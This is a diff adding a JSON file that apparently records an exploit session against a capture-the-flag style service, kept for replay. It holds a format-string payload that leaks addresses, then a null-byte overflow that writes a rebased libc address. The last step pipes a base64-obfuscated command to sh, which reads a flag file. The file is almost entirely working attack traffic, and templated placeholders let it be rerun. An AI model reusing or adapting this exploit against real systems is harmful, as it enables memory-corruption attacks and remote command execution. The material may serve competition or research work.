@@ -1,0 +1,9 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA{{{HEAP_BASE:46373:3:ORI:8:0x703525}}}:{{{HEAP_BASE:46629:3:ORI:12:0x703625}}}:{{{HEAP_BASE:46885:3:ORI:16:0x703725}}}:{{{HEAP_BASE:47141:3:ORI:20:0x703825}}}\\n", 
+    "1welcome!AAAAAAAA0x{{{STACK_BASE:-17328:12:HEX:18:0x7ffcc24b3c50}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7fa118609780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7fa11833a2c0}}}:0x7fa118830700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7fa118334147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent-{{{HEAP_BASE:63828:3:ORI:32:0x707954}}}e: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0echo \"Y2F0IC9mbGFncy9mYWtlLWNnaS9mbGFnIHxiYXNlNjQK\" |base64 -d |sh\\n", 
+    "2sh: 1: base64: not found\\n"
+]
